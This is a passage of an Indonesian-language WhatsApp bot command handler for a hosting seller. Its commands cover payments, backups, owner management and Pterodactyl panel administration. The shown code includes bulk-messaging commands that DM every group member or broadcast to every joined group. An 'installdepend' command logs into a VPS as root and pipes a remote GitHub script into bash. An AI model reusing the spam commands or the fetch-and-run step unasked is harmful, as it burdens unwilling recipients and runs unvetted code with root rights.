await Nvidia.sendMessage(m.sender, { document: fs.readFileSync("./library/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./library/database/contacts.vcf", "")
}}
break

case "pushkontak": {
if (!isOwner) return Reply(mess.owner)
if (!text) return m.reply(example("pesannya"))
const meta = await Nvidia.groupFetchAllParticipating()
let dom = await Object.keys(meta)
global.textpushkontak = text
let list = []
for (let i of dom) {
await list.push({
title: meta[i].subject, 
id: `.respushkontak ${i}`, 
description: `${meta[i].participants.length} Member`
})
}
return Nvidia.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Grup',
          sections: [
            {
              title: 'List Grup Chat',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Target Grup Pushkontak\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
break

case "pushkontak2": {
if (!isOwner) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
if (!text) return m.reply(example("pesannya"))
const teks = text
const jidawal = m.chat
const data = await Nvidia.groupMetadata(m.chat)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await m.reply(`Memproses *pushkontak*`)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
const vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n' 
            + `FN:${namaOwner}\n`
            + 'ORG:Developer;\n'
            + `TEL;type=CELL;type=VOICE;waid=${global.owner}:${global.owner}\n`
            + 'END:VCARD'
const sentMsg  = await Nvidia.sendMessage(mem, { contacts: { displayName: namaOwner, contacts: [{ vcard }] }})
await Nvidia.sendMessage(mem, {text: teks}, {quoted: sentMsg })
await sleep(global.delayPushkontak)
}}

await Nvidia.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break

case "jpmslide": {
if (!isCreator) return Reply(mess.owner)
let allgrup = await Nvidia.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await m.reply(`Memproses *jpmslide* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i)
count += 1
} catch {}
await sleep(global.delayJpm)
}
await Nvidia.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

case "jpmslidehidetag": case "jpmslideht": {
if (!isCreator) return Reply(mess.owner)
let allgrup = await Nvidia.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await m.reply(`Memproses *jpmslide hidetag* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i, allgrup[i].participants.map(e => e.id))
count += 1
} catch {}
await sleep(global.delayJpm)
}
await Nvidia.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

case "jpm": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("text"))
let allgrup = await Nvidia.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
const teks = text
await m.reply(`Memproses *jpm* teks Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await Nvidia.sendMessage(i, {text: `${teks}`}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await Nvidia.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

case "jpm2": {
    if (!isCreator) return Reply(mess.owner);
    if (!q) return m.reply(example("teks dengan mengirim foto/video"));
    if (!/image|video/.test(mime)) return m.reply(example("teks dengan mengirim foto/video"));

    const allgrup = await Nvidia.groupFetchAllParticipating();
    const res = Object.keys(allgrup);
    let count = 0;
    const teks = text;
    const jid = m.chat;
    const rest = await Nvidia.downloadAndSaveMediaMessage(qmsg);

    await m.reply(`Memproses *jpm* teks & media ke ${res.length} grup...`);

    for (let i of res) {
        if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm === true) continue;

        try {
            // Tentukan apakah media ini video atau image
            const mediaType = /video/.test(mime) ? "video" : "image";

            await Nvidia.sendMessage(i, {
                [mediaType]: fs.readFileSync(rest),
                caption: teks
            }, {quoted: qlocJpm});

            count += 1;
        } catch (e) {
            console.log(`Gagal kirim ke grup ${i}:`, e);
        }

        await sleep(global.delayJpm);
    }

    await fs.unlinkSync(rest);

    await Nvidia.sendMessage(jid, {
        text: `*Jpm Telah Selesai ✅*\nTotal grup yang berhasil dikirim pesan: ${count}`
    }, {quoted: m});
}
break;

case "jpmtesti": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
const allgrup = await Nvidia.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await Nvidia.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses *jpm* testimoni Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await Nvidia.sendMessage(i, {image: await fs.readFileSync(rest), caption: teks, contextInfo: { isForwarded: true, mentionedJid: [m.sender], businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: global.namaSaluran, newsletterJid: global.idSaluran }}}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await Nvidia.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

case "pay":
case "payment":
case "nope": {
  if (!global.image?.dana || !global.image?.ovo || !global.image?.gopay || !global.image?.qris)
    return m.reply('❌ Salah satu link gambar payment tidak ditemukan di global.image.')

  let imgdana = await prepareWAMessageMedia({ image: { url: global.image.dana } }, { upload: Nvidia.waUploadToServer })
  let imgovo = await prepareWAMessageMedia({ image: { url: global.image.ovo } }, { upload: Nvidia.waUploadToServer })
  let imggopay = await prepareWAMessageMedia({ image: { url: global.image.gopay } }, { upload: Nvidia.waUploadToServer })
  let imgqris = await prepareWAMessageMedia({ image: { url: global.image.qris } }, { upload: Nvidia.waUploadToServer })

  const msgii = await generateWAMessageFromContent(m.chat, {
    viewOnceMessageV2Extension: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: { text: "Pilih salah satu *payment* pembayaran yang tersedia" },
          carouselMessage: {
            cards: [
              {
                header: { hasMediaAttachment: true, ...imgdana },
                nativeFlowMessage: {
                  buttons: [{
                    name: "cta_copy",
                    buttonParamsJson: JSON.stringify({
                      display_text: "Dana Payment",
                      id: "123456789",
                      copy_code: global.dana
                    })
                  }]
                }
              },
              {
                header: { hasMediaAttachment: true, ...imgovo },
                nativeFlowMessage: {
                  buttons: [{
                    name: "cta_copy",
                    buttonParamsJson: JSON.stringify({
                      display_text: "OVO Payment",
                      id: "123456789",
                      copy_code: global.ovo
                    })
                  }]
                }
              },
              {
                header: { hasMediaAttachment: true, ...imggopay },
                nativeFlowMessage: {
                  buttons: [{
                    name: "cta_copy",
                    buttonParamsJson: JSON.stringify({
                      display_text: "Gopay Payment",
                      id: "123456789",
                      copy_code: global.gopay
                    })
                  }]
                }
              },
              {
                header: { hasMediaAttachment: true, ...imgqris },
                nativeFlowMessage: {
                  buttons: [{
                    name: "cta_url",
                    buttonParamsJson: JSON.stringify({
                      display_text: "QRIS Payment",
                      url: global.image.qris,
                      merchant_url: "https://www.google.com"
                    })
                  }]
                }
              }
            ]
          }
        })
      }
    }
  }, { userJid: m.sender, quoted: qtext2 });

  await Nvidia.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id });
}
break;

case "dana": {
if (!isCreator) return
let teks = `
*PAYMENT DANA FR3 HOSTINH*

* *Nomor :* 0882008771871

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await Nvidia.sendMessage(m.chat, {text: teks}, {quoted: qtext2})
}
break

case "qris": {
if (!isCreator) return 
await Nvidia.sendMessage(m.chat, {image: {url: global.image.qris}, caption: "\n*PAYMENT QRIS FR3 HOSTING*\n\n*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`"}, {quoted: qtext2})
}
break

case "ambilq": case "q": {
if (!m.quoted) return
let jsonData = JSON.stringify(m.quoted, null, 2)
m.reply(jsonData)
} 
break

case "proses": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("jasa install panel"))
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${linkSaluran}

*Marketplace :*
${linkGrup}`
await Nvidia.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Dana Masuk ✅`, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: linkSaluran,
}}}, {quoted: null})
}
break

case "done": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("jasa install panel"))
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${linkSaluran}

*Marketplace :*
${linkGrup}`
await Nvidia.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Transaksi Done ✅`, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: linkSaluran,
}}}, {quoted: null})
}
break

case "owner": {
await Nvidia.sendContact(m.chat, [global.owner], m)
}
break

case "save": case "sv": {
if (!isCreator) return
await Nvidia.sendContact(m.chat, [m.chat.split("@")[0]], m)
}
break

case "getcase": {
    if (!isCreator) return Reply(mess.owner);

    // Baca file airbus.js
    let filePath = "./command/airbus.js";
    let fileContent;

    try {
        fileContent = fs.readFileSync(filePath, "utf-8");
    } catch (err) {
        console.error("❌ Error membaca file:", err);
        return m.reply("⚠️ Terjadi kesalahan saat membaca file case.");
    }

    // Cari semua case yang tersedia
    let caseMatches = fileContent.match(/case\s+"(.*?)":/g);
    if (!caseMatches) return m.reply("⚠️ Tidak ada case ditemukan di file airbus.js.");

    let caseList = caseMatches.map(match => match.replace(/case\s+"|":/g, "").trim());

    // Jika user tidak memasukkan case, tampilkan list case dalam button list
    if (!text) {
        let sections = [
            {
                title: "📂 LIST CASE TERSEDIA",
                highlight_label: "🔍 Pilih Case",
                rows: caseList.map(cs => ({
                    title: `📌 ${cs}`,
                    id: `.getcase ${cs}`
                }))
            }
        ];

        let pesan = `╭─── 〔 *💾 DAFTAR CASE* 〕 ───╮\n` +
                    `📜 *Total Case:* ${caseList.length}\n\n` +
                    `🔹 Pilih case yang ingin ditampilkan dari daftar berikut:\n` +
                    `⚡ *Klik tombol di bawah!* 👇\n` +
                    `╰────────────────────────╯`;

        return await Nvidia.sendMessage(m.chat, {
            buttons: [
                {
                    buttonId: 'pilih-case',
                    buttonText: { displayText: '📂 Lihat Case' },
                    type: 4,
                    nativeFlowInfo: {
                        name: 'single_select',
                        paramsJson: JSON.stringify({ title: "📂 Pilih Case", sections })
                    }
                }
            ],
            footer: `📌 Bot By ${botname} | ⚡ Developer: FR3`,
            headerType: 1,
            viewOnce: true,
            text: pesan
        }, { quoted: m });
    }

    // Jika user memilih case tertentu, ambil isi case tersebut
    const getCaseContent = (caseName) => {
        let regex = new RegExp(`case\\s+"${caseName}":([\\s\\S]*?)break`, "g");
        let match = regex.exec(fileContent);
        return match ? `case "${caseName}":${match[1]}break` : null;
    };

    let caseContent = getCaseContent(text);
    if (!caseContent) {
        let pesanError = `⚠️ *Case tidak ditemukan!*\n\n` +
                         `🚫 Case *${text}* tidak ada dalam daftar.\n` +
                         `🔄 Silakan coba lagi dengan nama yang benar.`;
        return m.reply(pesanError);
    }

    // Kirim isi case yang dipilih dengan tampilan lebih elegan
    let pesanIsiCase = `╭─── 〔 *📜 DETAIL CASE* 〕 ───╮\n` +
                       `📌 *Case:* ${text}\n` +
                       `📂 *Isi Code:*\n\`\`\`${caseContent}\`\`\`\n` +
                       `╰───────────────────────────╯`;

    return m.reply(pesanIsiCase);
}
break;
case "ping":
case "uptime": {
  let timestamp = speed();
  let latensi = speed() - timestamp;
  let tio = await nou.os.oos();
  var tot = await nou.drive.info();

  // Waktu Lokal VPS
  const localTime = new Date().toLocaleString('id-ID', {
    timeZone: 'Asia/Jakarta',
    hour12: false
  });

  // Status Jaringan (ping ke google)
  let networkStatus = 'Unknown';
  try {
    require('child_process').execSync('ping -c 1 google.com', { stdio: 'ignore' });
    networkStatus = 'Online';
  } catch (err) {
    networkStatus = 'Offline';
  }

  // IP Publik VPS
  let publicIP = 'Tidak Diketahui';
  try {
    publicIP = require('child_process').execSync('curl -s ifconfig.me').toString().trim();
  } catch (e) {}

  // CPU & RAM Usage
  const cpuUsage = os.loadavg()[0].toFixed(2); // 1 menit average load
  const totalMem = os.totalmem();
  const freeMem = os.freemem();
  const usedMemPercent = ((totalMem - freeMem) / totalMem * 100).toFixed(2);

  // Informasi OS Lengkap
  const osInfo = `${os.type()} ${os.release()} (${os.arch()})`;
  const hostname = os.hostname();

  // Uptime VPS
  const vpsUptime = runtime(os.uptime());

  let respon = `
─────────────────────────────
INFORMATION SERVER
─────────────────────────────
• Hostname      : ${hostname}
• OS            : ${osInfo}
• Platform      : ${nou.os.type()}
• Total RAM     : ${formatp(totalMem)}
• RAM Usage     : ${usedMemPercent}%
• CPU Load      : ${cpuUsage}
• Total Disk    : ${tot.totalGb} GB
• Total CPU     : ${os.cpus().length} Core
• Runtime VPS   : ${vpsUptime}
• Local Time    : ${localTime}
• Network Status: ${networkStatus}
• Public IP     : ${publicIP}

─────────────────────────────
INFORMATION BOTZ
─────────────────────────────
• Response Speed: ${latensi.toFixed(4)} detik
• Runtime Bot   : ${runtime(process.uptime())}
• Version Bot   : ${versi}
• Bot Name      : ${botname}

─────────────────────────────
TIPS PENGGUNAAN:
- Pastikan koneksi internet stabil.
- Ketik *.menu* untuk daftar fitur.

─────────────────────────────
  `;

  await m.reply(respon);
}
break;

case "restart": case "rst": {
if (!isCreator) return Reply(mess.owner)
await m.reply("Memproses _restart server_ . . .")
var file = await fs.readdirSync("./session")
var anu = await file.filter(i => i !== "creds.json")
for (let t of anu) {
await fs.unlinkSync(`./session/${t}`)
}
await process.send('reset')
}
break

case "upchannel": case "upch": {
if (!isCreator) return Reply(mess.owner)
if (!text) return Reply(example("text"))
await Nvidia.sendMessage(idSaluran, {text: text})
Reply("Berhasil mengirim pesan *teks* ke dalam channel whatsapp")
}
break


case "upchannel2": case "upch2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return Reply(example("text dengan mengirim foto"))
if (!/image/.test(mime)) return Reply(example("text dengan mengirim foto"))
let img = await Nvidia.downloadAndSaveMediaMessage(qmsg)
await Nvidia.sendMessage(idSaluran, {image: await fs.readFileSync(img), caption: text})
Reply("Berhasil mengirim pesan *teks & foto* ke dalam channel whatsapp")
await fs.unlinkSync(img)
}
break

case "getsc": {
if (!isCreator) return Reply(mess.owner)
let dir = await fs.readdirSync("./library/database/sampah")
if (dir.length >= 2) {
let res = dir.filter(e => e !== "A")
for (let i of res) {
await fs.unlinkSync(`./library/database/sampah/${i}`)
}}
await m.reply("Memproses backup script bot")
var name = `backup`
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await Nvidia.sendMessage(m.sender, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
if (m.chat !== m.sender) return m.reply("Script bot berhasil dikirim ke private chat")
}
break

case "resetdb": case "rstdb": {
if (!isCreator) return Reply(mess.owner)
for (let i of Object.keys(global.db)) {
global.db[i] = {}
}
m.reply("Berhasil mereset database ✅")
}
break

case "setppbot": {
  if (!isCreator) return m.reply('❌ Khusus owner bot!')

  try {
    // Ambil pesan quoted dari konteks
    const quoted = m.quoted || m.msg?.contextInfo?.quotedMessage
    const mime = quoted?.mimetype || quoted?.imageMessage?.mimetype || ''

    if (!quoted || !/image/.test(mime)) {
      return m.reply('❌ Reply gambar dengan .setppbot')
    }

    // Unduh gambarnya
    const media = await downloadMediaMessage(
      m.quoted ? m.quoted : { key: m.msg.contextInfo.stanzaId, message: quoted },
      'buffer',
      {},
      { reuploadRequest: true }
    )

    const fs = require('fs')
    fs.writeFileSync('./media/menu.jpg', media)

    m.reply('✅ Foto berhasil diganti menjadi menu utama (./media/menu.jpg)')
  } catch (err) {
    console.log(err)
    m.reply('❌ Gagal menyimpan gambar. Pastikan reply gambar asli atau hasil forward.')
  }
}
break

case "clearchat": case "clc": {
if (!isCreator) return Reply(mess.owner)
Nvidia.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.timestamp }]}, m.chat)
}
break

case "listowner": case "listown": {
if (owners.length < 1) return m.reply("Tidak ada owner tambahan")
let teks = `\n *乂 List all owner tambahan*\n`
for (let i of owners) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
Nvidia.sendMessage(m.chat, {text: teks, mentions: owners}, {quoted: m})
}
break

case "delowner":
case "delown": {
  if (!isCreator) return Reply(mess.owner)
  if (!owners || owners.length < 1) return m.reply("❌ Tidak ada owner terdaftar.")

  // Buat sections
  const sections = [
    {
      title: "📂 LIST OWNER BOT",
      highlight_label: "🗑️ Hapus Owner",
      rows: owners.map(id => ({
        title: id.split("@")[0],
        description: "Klik untuk menghapus owner ini",
        id: `.delownerconfirm ${id}`
      }))
    }
  ]

  const pesan = `╭─── 〔 *🗑️ HAPUS OWNER* 〕 ───╮\n` +
                 `📜 *Total Owner:* ${owners.length}\n\n` +
                 `🔹 Pilih owner yang ingin dihapus dari list:\n` +
                 `⚡ *Klik tombol di bawah!* 👇\n` +
                 `╰────────────────────────╯`

  await Nvidia.sendMessage(m.chat, {
    buttons: [
      {
        buttonId: 'pilih-owner',
        buttonText: { displayText: '🗑️ Pilih Owner' },
        type: 4,
        nativeFlowInfo: {
          name: 'single_select',
          paramsJson: JSON.stringify({
            title: "🗑️ Pilih Owner",
            sections: sections
          })
        }
      }
    ],
    footer: "Pilih salah satu dari list di bawah",
    headerType: 1,
    viewOnce: true,
    text: pesan
  }, { quoted: m })
}
break

case "delownerconfirm": {
  if (!isCreator) return Reply(mess.owner)
  if (!text) return m.reply("❌ ID owner tidak valid.")

  if (!owners.includes(text)) return m.reply(`❌ Nomor ${text.split("@")[0]} bukan owner bot!`)

  let pos = owners.indexOf(text)
  await owners.splice(pos, 1)
  await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
  m.reply(`✅ Owner ${text.split("@")[0]} berhasil dihapus!`)
}
break

case "addowner": case "addown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owners.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi owner bot!`)
owners.push(input)
await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menambah owner ✅`)
}
break

case "clearserver": {
if (!isCreator) return Reply(mess.owner)
if (!text)  return m.reply("Tolong masukkan ID yang ingin dikecualikan setelah tanda koma.");
await Nvidia.sendMessage(m.chat, {
 footer: `© 2025 ${botname}`,
 buttons: [
 {
 buttonId: 'action',
 buttonText: { displayText: 'ini pesan interactiveMeta' },
 type: 4,
 nativeFlowInfo: {
 name: 'single_select',
 paramsJson: JSON.stringify({
 title: 'Sellect',
 sections: [
 {
 title: 'pilih ukuran',
 highlight_label: 'Recommended',
 rows: [
 {
 title: 'Server V1',
 id: `.server ${text}`
 },
 {
 title: 'Server V2',
 id: `.server-v2 ${text}`
 }, 
 {
 title: 'Server V3',
 id: `.server-v3 ${text}`
 }, 
 {
 title: 'Server V4',
 id: `.server-v4 ${text}`
 }, 
 {
 title: 'Server V5',
 id: `.server-v5 ${text}`
 } 
 ]
 }
 ]
 })
 }
 }
 ],
 headerType: 1,
 viewOnce: true,
 text: "Pilih server mana yang ingin kamu hapus.",
 contextInfo: {
 isForwarded: true, 
 mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
 },
}, {quoted: m})
}
break

case "server-v2": {
if (!isCreator) return Reply(mess.owner)
 const argsString = body.trim();
 const excludedIds = argsString.split(',').slice(1).map(id => id.trim()); // Ambil semua ID setelah koma

 if (excludedIds.length === 0) {
 return m.reply('Tolong masukkan ID yang ingin dikecualikan setelah tanda koma.\nContoh: ${command}-v2 , 201, 202, 203');
 }

 try {
 // Mendapatkan daftar server dari server 2
 let f = await fetch(global.domainV2 + "/api/application/servers", {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikeyV2,
 }
 });

 let res = await f.json();
 let servers = res.data;

 if (!servers || servers.length === 0) {
 return m.reply('Tidak ada server yang ditemukan di server 2.');
 }

 for (let server of servers) {
 let s = server.attributes;

 // Jika server ID ada di daftar pengecualian, lewati
 if (excludedIds.includes(s.id.toString())) {
 m.reply(`*Server dengan ID ${s.id} (${s.name}) dikecualikan dari penghapusan.*`);
 continue;
 }

 // Menghapus server
 let deleteServer = await fetch(global.domainV2 + "/api/application/servers/" + s.id, {
 method: "DELETE",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikeyV2,
 }
 });

 if (deleteServer.ok) {
 m.reply(`*Berhasil menghapus server dengan ID: ${s.id} (${s.name})*`);
 } else {
 let errorText = await deleteServer.text();
 m.reply(`Gagal menghapus server dengan ID: ${s.id}. Error: ${deleteServer.status} - ${errorText}`);
 }
 }

 m.reply('*Semua server berhasil dihapus dari server 2 kecuali yang dikecualikan!*');
 } catch (error) {
 return m.reply('Terjadi kesalahan di server 2: ' + error.message);
 }
 break;
}

case "user-v2": {
 if (!isOwner && !isCreator)
 return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 
 try {
 // Mengambil daftar user dari server 2
 let f = await fetch(global.domainV2 + "/api/application/users", {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikeyV2,
 }
 });

 let res = await f.json();
 let users = res.data;

 if (!users || users.length === 0) {
 return m.reply('Tidak ada user yang ditemukan di server 2.');
 }

 // Loop melalui setiap user
 for (let user of users) {
 let u = user.attributes;

 // Hanya hapus user yang bukan admin (root_admin = false)
 if (!u.root_admin) {
 let deleteUser = await fetch(global.domainV2 + "/api/application/users/" + u.id, {
 method: "DELETE",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikeyV2,
 }
 });

 // Cek status penghapusan user
 if (deleteUser.ok) {
 m.reply(`*Berhasil menghapus user dengan ID: ${u.id}* dari server 2`);
 } else {
 let errorText = await deleteUser.text();
 m.reply(`Gagal menghapus user dengan ID: ${u.id} dari server 2. Error: ${deleteUser.status} - ${errorText}`);
 }
 }
 }

 m.reply('*Semua user kecuali admin berhasil dihapus dari server 2!*');
 } catch (error) {
 return m.reply('Terjadi kesalahan: ' + error.message);
 }
 break;
 }

case "backup": {
  if (!isOwner) return onlyOwn();

  // Cari target backup (kalau tidak mention, default: pengirim)
  let jir = m.mentionedJid[0] || m.sender || Nvidia.parseMention(args[0]) || (args[0] && args[0].replace(/[@.+-]/g, '').replace(' ', '') + '@s.whatsapp.net') || '';

  await Nvidia.sendMessage(m.chat, { text: '⏳ Mengumpulkan semua file ke folder...' });

  const { execSync } = require("child_process");
  const ls = (await execSync("ls")).toString().split("\n").filter((pe) =>
    pe != "node_modules" &&
    pe != "session" &&
    pe != "package-lock.json" &&
    pe != "yarn.lock" &&
    pe != ""
  );

  await Nvidia.sendMessage(m.chat, { text: '⚡ Script berhasil di-backup. File akan dikirim lewat PC...' });

  await execSync(`zip -r Backup.zip ${ls.join(" ")}`);

  await Nvidia.sendMessage(jir, {
    document: await fs.readFileSync("./Backup.zip"),
    mimetype: "application/zip",
    fileName: "Backup.zip"
  }, { quoted: m });

  await execSync("rm -rf Backup.zip");

  // Kirim pesan tombol
  const buttonBackup = {
    text: `✅ Backup selesai!\nAkan dikirim ke:\n\n📱 *${jir.split("@")[0]}*\n\nSilakan klik tombol di bawah untuk konfirmasi.`,
    footer: "Backup By NvidiaBot | FR3 Developer",
    buttons: [
      {
        buttonId: ".confirmBackup",
        buttonText: { displayText: "✅ Confirm" },
        type: 1
      }
    ],
    headerType: 1
  };

  Nvidia.sendMessage(m.chat, buttonBackup, { quoted: m });
}
break;

case "confirmBackup": {
  if (!isOwner) return onlyOwn();
  m.reply(`🎉 Backup sudah dikirim dan dikonfirmasi!`);
}
break;

case "updomain": {
 if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner');
 
 if (text || m.quoted) {
 const newteks = m.quoted ? m.quoted.text : text;
 global.domain = newteks;
 await Nvidia.sendMessage(m.chat, { text: "_Berhasil Mengganti global.domain Panel✅_" }, { quoted: m });
 } else {
 await Nvidia.sendMessage(m.chat, { text: `*Format salah!*\nContoh: ${prefix + command} <global.domain>` }, { quoted: m });
 }
}
break;

;

case "upapikey": {
 if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner');
 
 if (!text && !m.quoted) return m.reply(`*Format Salah!*\nContoh: ${prefix + command} <Apikey>`);
 
 const newteks = m.quoted ? m.quoted.text : text;
 if (newteks) {
 global.apikey = newteks;
 return Nvidia.sendMessage(m.chat, { text: "_Berhasil Mengganti Apikey Panel✅_" });
 } else {
 return m.reply(`*Format Salah!*\nContoh: ${prefix + command} <Apikey>`);
 }
}
break;



case "upcapikey": {
 if (text || m.quoted) {
 const newteks = m.quoted ? m.quoted.text : text;
 if (!isOwner) return onlyOwn();
 global.capikey = `${text}`;
 Nvidia.sendMessage(m.chat, { text: "_Berhasil Mengganti Capikey Panel✅_" });
 } else {
 Nvidia.sendMessage(m.chat, { text: `*Format salah!*\nContoh: ${prefix + command} <Capikey>` });
 }
}
break

case "updomain-v2":{
 if (!isCreator) return Nvidia.sendMessage(m.chat, { text: '*[ System Notice ]* Khusus Owner Dan Pengguna Premium' });
 
 if (text || m.quoted) {
 const newteks = m.quoted ? m.quoted.text : text;
 global.domainV2 = newteks;
 await Nvidia.sendMessage(m.chat, { text: "_Berhasil Mengganti global.domain Panel✅_" }, { quoted: m });
 } else {
 await Nvidia.sendMessage(m.chat, { text: `*Format salah!*\nContoh: ${prefix + command} <global.domain>` }, { quoted: m });
 }
}
break;

case "upapikey-v2": {
 if (!isCreator) return Nvidia.sendMessage(m.chat, { text: '*[ System Notice ]* Khusus Owner Dan Pengguna Premium' });
 
 if (!text && !m.quoted) return Nvidia.sendMessage(m.chat, { text: `*Format Salah!*\nContoh: ${prefix + command} <Apikey>` });
 
 const newteks = m.quoted ? m.quoted.text : text;
 if (newteks) {
 global.apikeyV2 = newteks;
 return Nvidia.sendMessage(m.chat, { text: "_Berhasil Mengganti Apikey Panel✅_" });
 } else {
 return Nvidia.sendMessage(m.chat, { text: `*Format Salah!*\nContoh: ${prefix + command} <Apikey>` });
 }
}
break;

case "upcapikey-v2": {
 if (text || m.quoted) {
 const newteks = m.quoted ? m.quoted.text : text;
 if (!isOwner) return onlyOwn();
 global.capikeyV2 = `${text}`;
 Nvidia.sendMessage(m.chat, { text: "_Berhasil Mengganti Capikey Panel✅_" });
 } else {
 Nvidia.sendMessage(m.chat, { text: `*Format salah!*\nContoh: ${prefix + command} <Capikey>` });
 }
}
break;

case "installdepend": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (!isCreator) return Reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
 
const command = `bash <(curl -s https://raw.githubusercontent.com/KiwamiXq1031/installer-premium/refs/heads/main/zero.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses installdepend pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
